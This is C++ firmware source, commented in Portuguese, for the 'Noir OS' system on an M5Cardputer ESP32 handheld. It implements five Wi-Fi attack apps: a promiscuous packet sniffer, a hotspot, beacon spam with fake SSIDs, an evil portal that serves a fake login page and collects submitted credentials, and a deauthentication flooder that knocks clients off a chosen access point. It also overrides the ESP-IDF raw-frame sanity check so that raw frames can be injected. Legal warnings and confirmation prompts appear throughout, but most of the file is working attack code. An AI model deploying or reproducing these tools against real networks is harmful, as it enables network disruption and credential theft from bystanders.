// ============================================================================
//  Noir OS  -  Categoria "Rede / Ofensivo" (TX ativo - PERIGO)
//
//  Implementacao dos 5 apps ofensivos. Todos falam diretamente com o driver
//  esp_wifi (o mesmo caminho que o Bruce usa) para promiscuidade e injecao de
//  quadros 802.11 crus, alem das classes Arduino WiFi/DNSServer/WebServer.
//
//  ATENCAO LEGAL (docs/legal-etica.md): estas ferramentas TRANSMITEM. Emitir
//  beacons falsos, deauth, evil portal ou capturar trafego de terceiros pode
//  ser CRIME. Use APENAS em redes/dispositivos seus ou com autorizacao ESCRITA
//  e por escopo. O acento vermelho da barra de status acende (noir::setTxActive)
//  sempre que o radio esta transmitindo.
//
//  Sem PSRAM: nada de buffers gigantes. Frames 802.11 cabem em ~256 bytes.
//
//  SPDX-License-Identifier: AGPL-3.0-or-later
// ============================================================================
#include "apps/rede/rede_ofensivo.h"

#include "ui/widgets.h"
#include "ui/input.h"
#include "ui/theme.h"
#include "ui/statusbar.h"
#include "core/config.h"
#include "core/wifi_service.h"

#include <M5Cardputer.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>
#include <SPI.h>
#include <sys/time.h>   // gettimeofday() para timestamp de epoch no .pcap
#include <vector>

// Driver WiFi de baixo nivel do ESP-IDF (promiscuidade + injecao de quadros).
extern "C" {
#include "esp_wifi.h"
}

// ----------------------------------------------------------------------------
//  Bypass do "sanity check" de quadros crus.
//
//  A partir de certas versoes do IDF, esp_wifi_80211_tx() so aceita quadros
//  que passem por ieee80211_raw_frame_sanity_check(). Redefinindo essa funcao
//  (linkagem fraca -> a nossa vence) para sempre retornar 0, liberamos o envio
//  de beacons/deauth crus. Truque classico dos projetos de deauth para ESP32.
// ----------------------------------------------------------------------------
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

namespace {

// ============================================================================
//  RAII: acende o acento vermelho de "TX ativo" enquanto o objeto existir.
//  Garante que, saindo do app por qualquer caminho (return/erro), o alerta
//  vermelho apague. Ver noir::setTxActive() em core/app.h.
// ============================================================================
struct TxGuard {
    TxGuard()  { noir::setTxActive(true);  }
    ~TxGuard() { noir::setTxActive(false); }
};

// ----------------------------------------------------------------------------
//  Confirmacao de escopo: alem da confirmacao do launcher, cada ferramenta de
//  TX pede o seu proprio "sim" com um lembrete legal. Retorna true p/ seguir.
// ----------------------------------------------------------------------------
bool confirmarEscopo(const char* titulo, const String& detalhe) {
    String msg = detalhe + "\n\nUsar SO em rede propria ou\ncom autorizacao ESCRITA.\nTransmitir sem permissao\npode ser crime.";
    return ui::confirm(titulo, msg, /*danger=*/true);
}

// ----------------------------------------------------------------------------
//  Desenha um cabecalho de tela propria (fundo Noir + barra + titulo).
//  Retorna o M5Canvas ja limpo para o app continuar desenhando abaixo da barra.
// ----------------------------------------------------------------------------
void telaBase(const char* titulo) {
    ui::clearNoir();
    ui::statusBar(titulo);
}

// ============================================================================
//  App 1  -  SNIFFER (RX passivo; conta pacotes por tipo, .pcap opcional no SD)
//
//  NAO transmite -> nao acende o acento vermelho. Usa o modo promiscuo do
//  esp_wifi: registra um callback que recebe TODOS os quadros do canal atual.
//  Faz "channel hopping" (1..13) para varrer o espectro 2.4GHz.
// ============================================================================

// Contadores por tipo de quadro (atualizados dentro do callback -> volatile).
volatile uint32_t g_cntMgmt = 0;   // management (beacons, probe, deauth...)
volatile uint32_t g_cntCtrl = 0;   // control (ACK, RTS/CTS...)
volatile uint32_t g_cntData = 0;   // data (trafego real)
volatile uint32_t g_cntMisc = 0;   // outros
volatile uint32_t g_cntTotal = 0;

// Fila para levar pacotes do callback (contexto da task WiFi) ate o loop
// principal, onde e seguro escrever no SD. Sem PSRAM: slots pequenos.
struct PktSlot {
    uint16_t len;         // bytes validos em data (ate SNAP_LEN)
    uint32_t tsSec;
    uint32_t tsUsec;
    uint8_t  data[256];   // SNAP_LEN: truncamos quadros maiores
};
static const int  SNAP_LEN   = 256;
static const int  QUEUE_SLOTS = 16;   // 16 * ~268B ~= 4.3KB (cabe sem PSRAM)
QueueHandle_t g_pktQueue = nullptr;
volatile bool g_logSd = false;        // gravacao .pcap ligada?

// Callback do modo promiscuo. Roda na task do WiFi: seja rapido, sem alocacoes.
void snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    switch (type) {
        case WIFI_PKT_MGMT: g_cntMgmt++; break;
        case WIFI_PKT_CTRL: g_cntCtrl++; break;
        case WIFI_PKT_DATA: g_cntData++; break;
        default:            g_cntMisc++; break;
    }
    g_cntTotal++;

    // Se estamos gravando, empurra uma copia truncada para a fila.
    if (g_logSd && g_pktQueue) {
        const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
        PktSlot slot;
        uint16_t len = p->rx_ctrl.sig_len;
        if (len > SNAP_LEN) len = SNAP_LEN;
        slot.len = len;
        // Timestamp de epoch real via gettimeofday(): se houve sync NTP
        // (core/time_service) o relogio do sistema esta setado e o .pcap sai
        // com horario absoluto. Sem NTP, e' tempo desde o boot (relativo),
        // mas NUNCA envelopa como micros() (que estoura em ~71min de uptime).
        struct timeval tv;
        gettimeofday(&tv, nullptr);
        slot.tsSec  = (uint32_t)tv.tv_sec;
        slot.tsUsec = (uint32_t)tv.tv_usec;
        memcpy(slot.data, p->payload, len);
        // O callback roda na task do WiFi (nao em ISR): usa xQueueSend comum.
        // Sem bloquear (timeout 0): se a fila encher, o pacote e descartado.
        xQueueSend(g_pktQueue, &slot, 0);
    }
}

// Escreve o cabecalho global de um arquivo .pcap (formato classico libpcap).
void pcapGlobalHeader(File& f) {
    struct __attribute__((packed)) {
        uint32_t magic;     // 0xA1B2C3D4
        uint16_t verMajor;  // 2
        uint16_t verMinor;  // 4
        int32_t  thisZone;  // 0 (UTC)
        uint32_t sigFigs;   // 0
        uint32_t snapLen;   // SNAP_LEN
        uint32_t network;   // 105 = LINKTYPE_IEEE802_11 (802.11 cru)
    } gh = {0xA1B2C3D4, 2, 4, 0, 0, SNAP_LEN, 105};
    f.write((const uint8_t*)&gh, sizeof(gh));
}

// Escreve um registro (cabecalho + payload) de um pacote no .pcap.
void pcapWriteRecord(File& f, const PktSlot& s) {
    struct __attribute__((packed)) {
        uint32_t tsSec;
        uint32_t tsUsec;
        uint32_t inclLen;   // bytes salvos
        uint32_t origLen;   // tamanho original (aqui igual, ja truncado)
    } rh = {s.tsSec, s.tsUsec, s.len, s.len};
    f.write((const uint8_t*)&rh, sizeof(rh));
    f.write(s.data, s.len);
}

// Tenta montar o cartao SD (SPI do Cardputer). Retorna true se disponivel.
// Pinos do slot microSD do Cardputer v1.1 (ver docs/01-hardware.md):
//   SCK=40  MISO=39  MOSI=14  CS=12  (barramento SPI compartilhado)
bool sdBegin() {
    static const int SD_SCK = 40, SD_MISO = 39, SD_MOSI = 14, SD_CS = 12;
    SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
    return SD.begin(SD_CS, SPI, 20000000);
}

void appSniffer() {
    if (!confirmarEscopo("Sniffer",
        "Captura passiva de quadros\n802.11 do ar (RX)."))
        return;

    // Zera contadores.
    g_cntMgmt = g_cntCtrl = g_cntData = g_cntMisc = g_cntTotal = 0;
    g_logSd = false;

    // Pergunta se quer gravar .pcap (so faz sentido com SD).
    File pcap;
    if (ui::confirm("Sniffer", "Gravar captura em .pcap\nno cartao SD?", false)) {
        if (sdBegin()) {
            String nome = "/noir_sniff_" + String((uint32_t)(millis() / 1000)) + ".pcap";
            pcap = SD.open(nome, FILE_WRITE);
            if (pcap) {
                pcapGlobalHeader(pcap);
                g_pktQueue = xQueueCreate(QUEUE_SLOTS, sizeof(PktSlot));
                g_logSd = (g_pktQueue != nullptr);
            } else {
                ui::redStripe("Falha ao abrir arquivo no SD", 1500);
            }
        } else {
            ui::redStripe("SD nao encontrado", 1500);
        }
    }

    // Liga o modo promiscuo no driver.
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_start();
    wifi_promiscuous_filter_t filtro;
    filtro.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;   // captura tudo
    esp_wifi_set_promiscuous_filter(&filtro);
    esp_wifi_set_promiscuous_rx_cb(&snifferCb);
    esp_wifi_set_promiscuous(true);

    uint8_t canal = 1;
    uint32_t ultimaTrocaCanal = millis();
    uint32_t pktsGravados = 0;

    for (;;) {
        // Channel hopping: troca de canal a cada 250ms para varrer o espectro.
        if (millis() - ultimaTrocaCanal > 250) {
            canal = (canal % 13) + 1;
            esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
            ultimaTrocaCanal = millis();
        }

        // Drena a fila para o SD (fora do callback -> seguro escrever).
        if (g_logSd && pcap) {
            PktSlot s;
            while (xQueueReceive(g_pktQueue, &s, 0) == pdTRUE) {
                pcapWriteRecord(pcap, s);
                pktsGravados++;
            }
        }

        // Desenha a tela de contadores ao vivo.
        telaBase("Sniffer  (RX)");
        M5Canvas& g = ui::gfx();
        g.setTextColor(noir::BONE);
        g.setTextDatum(top_left);
        g.setFont(&fonts::Font2);
        int y = noir::STATUSBAR_H + 6;
        g.setCursor(8, y);      g.printf("Canal: %2d", canal);
        g.setTextColor(noir::WHITE);
        g.setCursor(120, y);    g.printf("Total: %lu", (unsigned long)g_cntTotal);
        g.setTextColor(noir::BONE);
        y += 20;
        g.setCursor(8, y);      g.printf("MGMT : %lu", (unsigned long)g_cntMgmt);
        y += 16;
        g.setCursor(8, y);      g.printf("DATA : %lu", (unsigned long)g_cntData);
        y += 16;
        g.setCursor(8, y);      g.printf("CTRL : %lu", (unsigned long)g_cntCtrl);
        y += 16;
        g.setCursor(8, y);      g.printf("MISC : %lu", (unsigned long)g_cntMisc);
        y += 18;
        g.setTextColor(noir::STEEL);
        if (g_logSd) { g.setCursor(8, y); g.printf("SD: %lu pkts gravados", (unsigned long)pktsGravados); }
        else         { g.setCursor(8, y); g.print("SD: desligado"); }
        g.setTextColor(noir::ASH);
        g.setCursor(8, noir::SCREEN_H - 14);
        g.print("` = parar");
        ui::present();

        // Sai com a tecla voltar.
        ui::KeyEvent e = ui::readKey();
        if (e.key == ui::Key::Back) break;

        delay(30);
    }

    // Encerra promiscuidade e libera recursos.
    esp_wifi_set_promiscuous(false);
    if (pcap) { pcap.flush(); pcap.close(); }
    // Desarma o guardiao ANTES de destruir a fila para evitar use-after-free:
    // zera g_logSd e o ponteiro global (o callback so toca a fila com ambos
    // validos), da uma pequena barreira para qualquer callback em voo terminar
    // e so entao libera a fila local.
    g_logSd = false;
    QueueHandle_t q = g_pktQueue;
    g_pktQueue = nullptr;
    delay(20);   // barreira: deixa um callback ja iniciado concluir
    if (q) vQueueDelete(q);
    WiFi.mode(WIFI_OFF);

    ui::messageBox("Sniffer",
        String("Capturados: ") + (unsigned long)g_cntTotal + " quadros\n" +
        "MGMT " + (unsigned long)g_cntMgmt + "  DATA " + (unsigned long)g_cntData + "\n" +
        (pktsGravados ? String("Salvos no SD: ") + pktsGravados : String("Sem gravacao")));
}

// ============================================================================
//  App 2  -  HOTSPOT / AP (cria um ponto de acesso; TX ativo)
//
//  WiFi.softAP() faz o ESP virar um AP. O radio transmite beacons -> acendemos
//  o acento vermelho. Mostra IP e numero de clientes conectados ao vivo.
// ============================================================================
void appHotspot() {
    // SSID/senha configuraveis (persistidos; chaves NVS <= 15 chars).
    String ssid = noir::config::getStr("ap_ssid", "Noir-AP");
    String pass = noir::config::getStr("ap_pass", "noir12345");

    bool ok = true;
    ssid = ui::textInput("SSID do AP", ssid, false, &ok);
    if (!ok || ssid.length() == 0) return;
    pass = ui::textInput("Senha (>=8 ou vazio)", pass, false, &ok);
    if (!ok) return;
    // WPA2 exige senha com >= 8 chars; senao vira rede aberta.
    bool aberta = (pass.length() < 8);

    noir::config::setStr("ap_ssid", ssid);
    if (!aberta) noir::config::setStr("ap_pass", pass);

    String info = "SSID: " + ssid + "\n" + (aberta ? "Rede ABERTA (sem senha)" : "WPA2 com senha");
    if (!confirmarEscopo("Hotspot / AP", info)) return;

    TxGuard tx;   // acende o acento vermelho durante todo o AP

    WiFi.mode(WIFI_MODE_AP);
    bool up = WiFi.softAP(ssid.c_str(), aberta ? nullptr : pass.c_str());
    if (!up) {
        ui::redStripe("Falha ao subir o AP", 1500);
        WiFi.mode(WIFI_OFF);
        return;
    }
    IPAddress ip = WiFi.softAPIP();

    for (;;) {
        telaBase("Hotspot  (TX)");
        M5Canvas& g = ui::gfx();
        g.setTextDatum(top_left);
        g.setFont(&fonts::Font2);
        int y = noir::STATUSBAR_H + 8;
        g.setTextColor(noir::WHITE); g.setCursor(8, y); g.print(ssid); y += 20;
        g.setTextColor(noir::BONE);
        g.setCursor(8, y); g.print("IP:  " + ip.toString()); y += 16;
        g.setCursor(8, y); g.printf("Clientes: %d", WiFi.softAPgetStationNum()); y += 16;
        g.setTextColor(noir::STEEL);
        g.setCursor(8, y); g.print(aberta ? "Seguranca: aberta" : "Seguranca: WPA2");
        g.setTextColor(noir::ASH);
        g.setCursor(8, noir::SCREEN_H - 14); g.print("` = parar AP");
        ui::present();

        ui::KeyEvent e = ui::readKey();
        if (e.key == ui::Key::Back) break;
        delay(120);
    }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

// ============================================================================
//  App 3  -  BEACON SPAM (injeta beacons de SSIDs falsos; TX ativo)
//
//  Monta um quadro beacon 802.11 cru e o envia com esp_wifi_80211_tx() para
//  cada SSID de uma lista curta e fixa, num canal escolhido. Isso faz varias
//  redes "fantasma" aparecerem no scan de outros aparelhos.
// ============================================================================

// Lista fixa e curta de SSIDs falsos (didatico; nada de dicionarios enormes).
const char* const FAKE_SSIDS[] = {
    "FREE_WIFI", "Noir_Ghost", "NET_VIRUS", "xXx_HACK", "Pineapple", "SEM_INTERNET"
};
const int FAKE_SSIDS_COUNT = sizeof(FAKE_SSIDS) / sizeof(FAKE_SSIDS[0]);

// Template de um quadro beacon. Campos preenchidos em tempo de execucao:
//  - src/bssid (MAC de origem, randomizado por SSID)
//  - SSID (tag 0) e canal (tag DS param).
void enviarBeacon(const char* ssid, uint8_t canal) {
    uint8_t pkt[128];
    int i = 0;

    // --- Cabecalho MAC (24 bytes) ---
    pkt[i++] = 0x80; pkt[i++] = 0x00;                 // frame control: beacon
    pkt[i++] = 0x00; pkt[i++] = 0x00;                 // duration
    for (int k = 0; k < 6; k++) pkt[i++] = 0xFF;      // dest: broadcast
    // src + bssid: MAC "locally administered" randomizado.
    uint8_t mac[6] = { 0x02, 0x00, 0x00,
                       (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256) };
    for (int k = 0; k < 6; k++) pkt[i++] = mac[k];    // src
    for (int k = 0; k < 6; k++) pkt[i++] = mac[k];    // bssid
    pkt[i++] = 0x00; pkt[i++] = 0x00;                 // seq/frag

    // --- Corpo do beacon ---
    for (int k = 0; k < 8; k++) pkt[i++] = 0x00;      // timestamp
    pkt[i++] = 0x64; pkt[i++] = 0x00;                 // beacon interval (100 TU)
    pkt[i++] = 0x01; pkt[i++] = 0x04;                 // capability (ESS)

    // Tag 0: SSID
    uint8_t slen = (uint8_t)strlen(ssid);
    if (slen > 32) slen = 32;
    pkt[i++] = 0x00; pkt[i++] = slen;
    memcpy(&pkt[i], ssid, slen); i += slen;

    // Tag 1: supported rates
    const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    memcpy(&pkt[i], rates, sizeof(rates)); i += sizeof(rates);

    // Tag 3: DS parameter set (canal)
    pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = canal;

    esp_wifi_80211_tx(WIFI_IF_STA, pkt, i, false);
}

void appBeaconSpam() {
    // Escolhe o canal (1..13).
    int canal = noir::config::getInt("bs_canal", 1);
    std::vector<String> canais;
    for (int c = 1; c <= 13; c++) canais.push_back(String("Canal ") + c);
    int r = ui::listView("Canal do beacon spam", canais, canal - 1);
    if (r < 0) return;
    canal = r + 1;
    noir::config::setInt("bs_canal", canal);

    String lista;
    for (int k = 0; k < FAKE_SSIDS_COUNT; k++) lista += String("- ") + FAKE_SSIDS[k] + "\n";
    if (!confirmarEscopo("Beacon Spam",
        String("Cria ") + FAKE_SSIDS_COUNT + " redes falsas\nno canal " + canal + "."))
        return;

    TxGuard tx;   // acende o acento vermelho durante a injecao

    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);   // habilita o caminho de injecao crua
    esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
    randomSeed(micros());

    uint32_t enviados = 0;
    uint32_t ultimoDesenho = 0;

    for (;;) {
        // Rajada: um beacon por SSID por ciclo.
        for (int k = 0; k < FAKE_SSIDS_COUNT; k++) {
            enviarBeacon(FAKE_SSIDS[k], (uint8_t)canal);
            enviados++;
        }

        // Redesenha ~5x/s (nao a cada beacon, para nao pesar).
        if (millis() - ultimoDesenho > 200) {
            telaBase("Beacon Spam  (TX)");
            M5Canvas& g = ui::gfx();
            g.setTextDatum(top_left);
            g.setFont(&fonts::Font2);
            int y = noir::STATUSBAR_H + 8;
            g.setTextColor(noir::BLOOD); g.setCursor(8, y); g.printf("Canal %d  TRANSMITINDO", canal); y += 20;
            g.setTextColor(noir::BONE);  g.setCursor(8, y); g.printf("SSIDs falsos: %d", FAKE_SSIDS_COUNT); y += 16;
            g.setTextColor(noir::WHITE); g.setCursor(8, y); g.printf("Beacons: %lu", (unsigned long)enviados);
            g.setTextColor(noir::ASH);   g.setCursor(8, noir::SCREEN_H - 14); g.print("` = parar");
            ui::present();
            ultimoDesenho = millis();
        }

        ui::KeyEvent e = ui::readKey();
        if (e.key == ui::Key::Back) break;
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
}

// ============================================================================
//  App 4  -  EVIL PORTAL (softAP aberto + DNS captura-tudo + pagina de login)
//
//  Sobe um AP aberto, um DNSServer que responde TODO dominio com o IP do AP
//  (captive portal), e um WebServer que serve uma pagina de login. Credenciais
//  submetidas ficam SO em memoria/tela (teste autorizado). NADA e persistido.
// ============================================================================

// Objetos globais (o WebServer usa handlers estaticos -> precisam de acesso).
DNSServer   g_dns;
WebServer   g_web(80);
std::vector<String> g_creds;      // "usuario / senha" capturados
volatile uint32_t   g_hits = 0;   // quantas vezes o portal foi aberto

// HTML da pagina de login (embutido). Simples de proposito.
const char* PORTAL_HTML =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>Login</title><style>body{font-family:sans-serif;background:#111;color:#eee;"
    "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
    "form{background:#1c1c1c;padding:24px;border-radius:8px;width:280px}"
    "h2{margin:0 0 16px}input{width:100%;padding:10px;margin:6px 0;border:0;border-radius:4px}"
    "button{width:100%;padding:10px;margin-top:10px;background:#8b0000;color:#fff;border:0;border-radius:4px}"
    "</style></head><body><form method='POST' action='/login'>"
    "<h2>Autenticacao WiFi</h2>"
    "<input name='user' placeholder='Usuario ou e-mail'>"
    "<input name='pass' type='password' placeholder='Senha'>"
    "<button type='submit'>Entrar</button></form></body></html>";

// Serve o portal para qualquer rota nao mapeada (captive portal).
void portalRoot() {
    g_hits++;
    g_web.send(200, "text/html", PORTAL_HTML);
}

// Recebe o POST do formulario e registra as credenciais em memoria.
void portalLogin() {
    String u = g_web.arg("user");
    String p = g_web.arg("pass");
    if (u.length() || p.length()) {
        String linha = u + " / " + p;
        if (g_creds.size() < 20) g_creds.push_back(linha);   // limite de memoria
    }
    // Devolve a mesma pagina (o alvo "erra a senha" e tenta de novo).
    g_web.send(200, "text/html", PORTAL_HTML);
}

void appEvilPortal() {
    String ssid = noir::config::getStr("ep_ssid", "WiFi Gratis");
    bool ok = true;
    ssid = ui::textInput("SSID do portal", ssid, false, &ok);
    if (!ok || ssid.length() == 0) return;
    noir::config::setStr("ep_ssid", ssid);

    if (!confirmarEscopo("Evil Portal",
        String("AP aberto '") + ssid + "'\n+ pagina de login falsa.\nCaptura credenciais (teste)."))
        return;

    g_creds.clear();
    g_hits = 0;

    TxGuard tx;   // AP aberto = TX ativo

    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(ssid.c_str());   // sem senha -> rede aberta
    IPAddress ip = WiFi.softAPIP();

    // DNS captura-tudo: "*" resolve tudo para o IP do AP.
    g_dns.start(53, "*", ip);

    // Rotas do WebServer: raiz + login + qualquer outra (captive detection).
    // Registradas UMA UNICA VEZ: g_web.on()/onNotFound() empilham handlers numa
    // lista ligada no heap; re-registrar a cada entrada no app vazaria memoria.
    static bool rotasRegistradas = false;
    if (!rotasRegistradas) {
        g_web.on("/login", HTTP_POST, portalLogin);
        g_web.onNotFound(portalRoot);   // qualquer URL cai no portal
        g_web.on("/", portalRoot);
        rotasRegistradas = true;
    }
    g_web.begin();

    uint32_t ultimoDesenho = 0;

    for (;;) {
        // Bombeia as duas engrenagens do portal a cada volta do loop.
        g_dns.processNextRequest();
        g_web.handleClient();

        if (millis() - ultimoDesenho > 200) {
            telaBase("Evil Portal  (TX)");
            M5Canvas& g = ui::gfx();
            g.setTextDatum(top_left);
            g.setFont(&fonts::Font2);
            int y = noir::STATUSBAR_H + 6;
            g.setTextColor(noir::WHITE); g.setCursor(8, y); g.print(ssid); y += 18;
            g.setTextColor(noir::STEEL);
            g.setCursor(8, y); g.print("IP " + ip.toString());
            g.setCursor(150, y); g.printf("hits %lu", (unsigned long)g_hits); y += 16;
            g.setTextColor(noir::BLOOD); g.setCursor(8, y); g.printf("Credenciais: %d", (int)g_creds.size()); y += 16;
            // Mostra as ultimas 3 capturas.
            g.setFont(&fonts::Font0);
            g.setTextColor(noir::BONE);
            int inicio = g_creds.size() > 3 ? g_creds.size() - 3 : 0;
            for (int k = inicio; k < (int)g_creds.size(); k++) {
                g.setCursor(8, y); g.print(g_creds[k].substring(0, 38)); y += 12;
            }
            g.setTextColor(noir::ASH);
            g.setCursor(8, noir::SCREEN_H - 12); g.print("` = parar");
            ui::present();
            ultimoDesenho = millis();
        }

        ui::KeyEvent e = ui::readKey();
        if (e.key == ui::Key::Back) break;
    }

    g_web.stop();
    g_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);

    // Resumo final das capturas (some da memoria ao sair).
    String resumo = String("Credenciais capturadas: ") + (int)g_creds.size();
    for (int k = 0; k < (int)g_creds.size() && k < 6; k++) resumo += "\n" + g_creds[k];
    ui::messageBox("Evil Portal", resumo);
    g_creds.clear();
}

// ============================================================================
//  App 5  -  DEAUTH (envia quadros de desautenticacao; TX ativo - PERIGO MAX)
//
//  Escaneia redes, o usuario escolhe o alvo (BSSID + canal) e o Noir injeta
//  quadros deauth 802.11 crus, expulsando clientes daquele AP. Ferramenta de
//  maior peso legal: SO em rede propria/autorizada.
// ============================================================================

// Monta e envia um quadro deauth. dst = cliente (ou broadcast); ap = BSSID.
void enviarDeauth(const uint8_t* apBssid, const uint8_t* dst) {
    uint8_t pkt[26];
    int i = 0;
    pkt[i++] = 0xC0; pkt[i++] = 0x00;                 // frame control: deauth
    pkt[i++] = 0x00; pkt[i++] = 0x00;                 // duration
    for (int k = 0; k < 6; k++) pkt[i++] = dst[k];    // dest
    for (int k = 0; k < 6; k++) pkt[i++] = apBssid[k];// src = AP
    for (int k = 0; k < 6; k++) pkt[i++] = apBssid[k];// bssid = AP
    pkt[i++] = 0x00; pkt[i++] = 0x00;                 // seq
    pkt[i++] = 0x07; pkt[i++] = 0x00;                 // reason: class-3 frame

    esp_wifi_80211_tx(WIFI_IF_STA, pkt, i, false);
}

void appDeauth() {
    // 1) Escaneia e lista redes para escolher o alvo.
    ui::progress("Deauth", "Escaneando alvos...", 30);
    std::vector<noir::wifi::Network> nets;
    int n = noir::wifi::scan(nets);
    if (n == 0) {
        ui::messageBox("Deauth", "Nenhuma rede encontrada.");
        return;
    }
    std::vector<String> items;
    for (auto& net : nets)
        items.push_back(net.ssid + "  ch" + String((int)net.channel) + "  " + String((int)net.rssi) + "dBm");
    int sel = ui::listView("Alvo do deauth", items, 0, /*dangerFrom=*/0);
    if (sel < 0) return;

    // Converte o BSSID textual ("aa:bb:cc:dd:ee:ff") em 6 bytes.
    uint8_t bssid[6] = {0};
    {
        const String& b = nets[sel].bssid;
        for (int k = 0; k < 6; k++)
            bssid[k] = (uint8_t)strtol(b.substring(k * 3, k * 3 + 2).c_str(), nullptr, 16);
    }
    uint8_t canal = (uint8_t)nets[sel].channel;
    String alvo = nets[sel].ssid;

    if (!confirmarEscopo("Deauth  (PERIGO)",
        String("Expulsar clientes de:\n") + alvo + "  (ch " + canal + ").\nInterromper rede alheia\ne CRIME."))
        return;

    TxGuard tx;   // acende o acento vermelho durante o ataque

    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);

    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint32_t enviados = 0;
    uint32_t ultimoDesenho = 0;

    for (;;) {
        // Rajada de deauth para broadcast (todos os clientes do AP).
        for (int b = 0; b < 8; b++) { enviarDeauth(bssid, broadcast); enviados++; }

        if (millis() - ultimoDesenho > 200) {
            telaBase("Deauth  (TX)");
            M5Canvas& g = ui::gfx();
            g.setTextDatum(top_left);
            g.setFont(&fonts::Font2);
            int y = noir::STATUSBAR_H + 8;
            g.setTextColor(noir::BLOOD); g.setCursor(8, y); g.print("ATACANDO"); y += 20;
            g.setTextColor(noir::WHITE); g.setCursor(8, y); g.print(alvo.substring(0, 24)); y += 16;
            g.setTextColor(noir::BONE);  g.setCursor(8, y); g.printf("Canal %d", canal); y += 16;
            g.setCursor(8, y); g.printf("Frames: %lu", (unsigned long)enviados);
            g.setTextColor(noir::ASH);   g.setCursor(8, noir::SCREEN_H - 14); g.print("` = parar");
            ui::present();
            ultimoDesenho = millis();
        }

        ui::KeyEvent e = ui::readKey();
        if (e.key == ui::Key::Back) break;
        delay(5);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
}

} // namespace

// ============================================================================
//  Exportacao do modulo. Apps de PERIGO por ULTIMO (todos danger=true aqui).
//  O sniffer e RX passivo, mas o modulo inteiro entra na secao de perigo do
//  menu Rede -> marcado danger=true por convencao do modulo.
// ============================================================================
namespace apps {
namespace rede {

const noir::AppEntry OFENSIVO_APPS[] = {
    {"Sniffer",      "rx/pcap", appSniffer,    true},
    {"Hotspot / AP", "tx ap",   appHotspot,    true},
    {"Beacon Spam",  "tx spam", appBeaconSpam, true},
    {"Evil Portal",  "tx cred", appEvilPortal, true},
    {"Deauth",       "tx max",  appDeauth,     true},
};
const int OFENSIVO_APPS_COUNT = sizeof(OFENSIVO_APPS) / sizeof(OFENSIVO_APPS[0]);

} // namespace rede
} // namespace apps
